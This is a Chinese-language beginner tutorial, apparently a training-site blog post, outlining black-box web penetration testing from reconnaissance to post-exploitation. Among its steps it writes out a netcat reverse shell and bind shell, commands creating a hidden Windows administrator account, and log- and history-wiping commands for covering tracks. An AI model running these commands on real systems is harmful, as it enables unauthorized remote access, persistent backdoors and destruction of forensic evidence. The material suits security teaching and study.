原创： XIY 合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

Web渗透测试分为白盒测试和黑盒测试，白盒测试是指目标网站的源码等信息的情况下对其渗透，相当于代码分析审计。而黑盒测试则是在对该网站系统信息不知情的情况下渗透，以下所说的Web渗透就是黑盒渗透。Web渗透分为以下几个步骤，信息收集，漏洞扫描，漏洞利用，提权，内网渗透，留后门，清理痕迹。一般的渗透思路就是看是否有注入漏洞，然后注入得到后台管理员账号密码，登录后台，上传小马，再通过小马上传大马，提权，内网转发，进行内网渗透，扫描内网c段存活主机及开放端口，看其主机有无可利用漏洞（nessus）端口（nmap）对应服务及可能存在的漏洞，对其利用（msf）拿下内网，留下后门，清理痕迹。或者看是否有上传文件的地方，上传一句话木马，再用菜刀链接，拿到数据库并可执行cmd命令，可继续上大马.........思路很多，很多时候成不成功可能就是一个思路的问题，技术可以不高，思路一定得骚。

![v2-b6ac4acb391e97c8ef3bf1f3f5fe9a62_hd.w](https://pic4.zhimg.com/80/v2-b6ac4acb391e97c8ef3bf1f3f5fe9a62_hd.webp)

信息收集信息收集是整个流程的重中之重，前期信息收集的越多，Web渗透的成功率就越高。DNS域名信息：通过url获取其真实ip,子域名(Layer子域名爆破机)，旁站(K8旁站，御剑1.5)，c段，网站负责人及其信息（whois查询）整站信息：服务器操作系统、服务器类型及版本(Apache/Nginx/Tomcat/IIS)、数据库类型(Mysql/Oracle/Accees/Mqlserver)、脚本类型(php/jsp/asp/aspx)、CMS类型；网站常见搭配为：ASP和ASPX：ACCESS、SQLServerPHP：MySQL、PostgreSQLJSP：Oracle、MySQL敏感目录信息（御剑，dirbust）开放端口信息（nmp）

![v2-a17f39b0263ccd7b5082f9456ca34bcd_hd.w](https://pic2.zhimg.com/80/v2-a17f39b0263ccd7b5082f9456ca34bcd_hd.webp)

漏洞扫描利用AWVS,AppScan,OWASP-ZAP,等可对网站进行网站漏洞的初步扫描，看其是否有可利用漏洞。常见漏洞：SQL注入XSS跨站脚本CSRF跨站请求伪造XXE(XML外部实体注入)漏洞SSRF(服务端请求伪造)漏洞文件包含漏洞文件上传漏洞文件解析漏洞远程代码执行漏洞CORS跨域资源共享漏洞越权访问漏洞目录遍历漏洞和任意文件读取/下载漏洞

![v2-bf4dd73df11d94303ce4193bd4b64177_hd.w](https://pic3.zhimg.com/80/v2-bf4dd73df11d94303ce4193bd4b64177_hd.webp)

漏洞利用用工具也好什么也好对相应漏洞进行利用如：Sql注入（sqlmap）XSS（BEEF）后台密码爆破（burp）端口爆破（hydra）

![v2-8eca10306f15d37895c9e4a1e29a2feb_hd.w](https://pic3.zhimg.com/80/v2-8eca10306f15d37895c9e4a1e29a2feb_hd.webp)

提权获得shell之后我们权限可能很低，因此要对自己提权，可以根据服务器版本对应的exp进行提权，对于Windows系统也可看其补丁对应漏洞的exp进行提权

![v2-bf6d294526f12eab48e6dc3b64acae96_hd.w](https://pic4.zhimg.com/80/v2-bf6d294526f12eab48e6dc3b64acae96_hd.webp)

内网渗透首先进行端口转发可用ncnc使用方法：反向连接在公网主机上进行监听：nc-lvp 4444在内网主机上执行：nc-e cmd.exe
公网主机ip4444成功之后即可得到一个内网主机shell正向连接远程主机上执行：nc-l -p 4444 -t -e cmd.exe本地主机上执行：nc-vv
远程主机ip4444成功后，本地主机即可远程主机的一个shell然后就是对内网进行渗透了，可以用主机漏洞扫描工具（nessus,x-scan等）进行扫描看是否有可用漏洞，可用msf进行利用，或者用nmap扫描存活主机及开放端口，可用hydra进行端口爆破或者用msf对端口对应漏洞得到shell拿下内网留后门

![v2-a79f3ccfcdcddcfccf8d8e039e539803_hd.w](https://pic3.zhimg.com/80/v2-a79f3ccfcdcddcfccf8d8e039e539803_hd.webp)

留后门对于网站上传一句话木马，留下后门对于windows用户可用hideadmin创建一个超级隐藏账户手工：netuser test$ 123456
/addnetlocalgroup administrators test$
/add这样的话在cmd命令中看不到，但在控制面板可以看到，还需要改注册表才能实现控制版面也看不到，太过麻烦，不多赘述，所以还是用工具省心省力。

![v2-a8ab9696f562e16261e9d0cd503f046b_hd.w](https://pic2.zhimg.com/80/v2-a8ab9696f562e16261e9d0cd503f046b_hd.webp)

痕迹清理日志清理：在win环境下的话用msf清理，命令如下：runclearlogsclearev如果在Liunx环境下：rm-f -r
/var/log删除/var/log下的文件exportHISTSIZE=0export
HISTSIZE=0删除bashshell保存的最后500条命令3389远程登陆记录清除：@echooff@regdelete
"HKEY_CURRENT_USER\Software\Microsoft\TerminalServerClient\Default" /va
/f@del"%USERPROFILE%\My Documents\Default.rdp"
/a@exit另外在渗透时尽量用代理以免轻易的暴露自己ip。本人呢，也是个刚入安全圈的菜鸡，以上是在学习中对渗透过程的一点总结，大牛勿喷，希望可以帮到那些刚刚入门的信息安全爱好者。

![v2-391128842e3e21d144f46d1464f30a5c_hd.w](https://pic4.zhimg.com/80/v2-391128842e3e21d144f46d1464f30a5c_hd.webp)

相关练习渗透综合场景演练：利用自己学习到的知识对目标进行渗透测试，获取目标系统的权限，从而获取敏感信息，那么恭喜你，你已经完成了从安全小白到渗透测试工程师的蜕变。点击“[课程:渗透综合场景演练(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=C9d6c0ca797abec2017041916244000001)”，可预览学习（PC端操作最佳哟）

![v2-e57350be98f3fcaa2757502564d38e92_hd.w](https://pic4.zhimg.com/80/v2-e57350be98f3fcaa2757502564d38e92_hd.webp)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创，如需转载，请注明出处！

  

